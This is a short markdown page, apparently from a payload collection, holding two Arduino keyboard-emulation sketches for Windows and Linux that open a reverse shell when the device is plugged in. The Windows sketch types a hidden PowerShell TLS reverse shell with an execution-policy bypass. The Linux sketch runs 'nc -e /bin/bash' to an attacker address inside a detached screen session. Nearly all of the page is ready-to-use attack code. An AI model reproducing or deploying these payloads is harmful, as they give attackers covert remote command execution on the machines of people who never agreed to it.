## USB to Reverse Shell (nc -lvnp [port]) (Win+Linux)

**Windows**

```
#include <Keyboard.h>
void setup() {
    Keyboard.begin();
}
void loop() {
    delay(500);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press("r");
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("cmd");
    Keyboard.press(KEY_RETURN);
    delay(1500);
    Keyboard.release(KEY_RETURN);
    delay(1500);
    Keyboard.print("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('<your-ip>', 4444);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"");
    Keyboard.press(KEY_RETURN);
    delay(500);
    Keyboard.release(KEY_RETURN);
    delay(500); 
}
```

**Linux**

```
#include <Keyboard.h>
void setup() {
    Keyboard.begin();
}
void loop() {
    delay(500);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    delay(500);
    Keyboard.releaseAll();
    delay(1500);
    Keyboard.println("screen -md \"bash -c 'exec -a shell nc -e /bin/bash <your-ip> 4444'\"");
    Keyboard.write(KEY_RETURN);
    Keyboard.println("exit");
    Keyboard.write(KEY_RETURN);
}
```

[Original Project](https://github.com/UncleJ4ck/HID-Attack)